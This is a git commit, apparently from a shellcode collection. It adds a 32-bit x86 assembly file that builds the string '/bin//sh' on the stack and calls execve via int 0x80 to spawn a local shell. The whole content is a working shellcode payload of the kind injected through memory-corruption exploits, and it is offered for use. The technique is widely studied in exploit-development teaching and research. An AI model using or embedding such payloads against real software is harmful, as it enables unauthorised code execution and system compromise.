c28cb1537a9d8cd91beb8a280688d47390654700
prole <prole@thoughtgang.org>
2013-03-11 05:47:49 -0400

    32 bit local to match the 64 bit local /bin/sh

---
+++ 32bitLocalBinSh/shell32.s
@@ -0,0 +1,17 @@
+;; Mon Mar 11 05:34:41 PDT 2013
+;; EBX, ECX, EDX, ESI, EDI, EBP then stack
+BITS 32
+global main
+	%include "../include/syscalls32.s"
+
+main:
+	; execve("/bin/sh", 0, 0)
+	xor eax, eax
+	push eax
+	push 0x68732f2f 	; "//sh" -> stack
+	push 0x6e69622f 	; "/bin" -> stack
+	mov ebx, esp		; arg1 = "/bin//sh\0"
+	mov ecx, eax		; arg2 = 0
+	mov edx, eax		; arg3 = 0
+	mov al, __NR_execve
+	int 0x80
